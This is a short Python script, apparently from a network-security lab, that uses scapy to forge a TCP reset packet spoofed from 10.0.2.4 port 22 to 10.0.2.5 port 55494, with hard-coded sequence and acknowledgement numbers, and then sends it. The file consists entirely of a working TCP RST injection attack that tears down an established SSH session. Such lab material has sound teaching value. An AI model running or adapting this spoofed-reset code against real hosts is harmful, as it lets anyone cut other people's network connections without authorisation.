#!/usr/bin/python
from scapy.all import *

ip = IP(src="10.0.2.4", dst="10.0.2.5")
tcp = TCP(sport=22, dport=55494, flags="R", seq=565176032, ack=3567039357)

pkt = ip / tcp
ls(pkt)
send(pkt, verbose=0)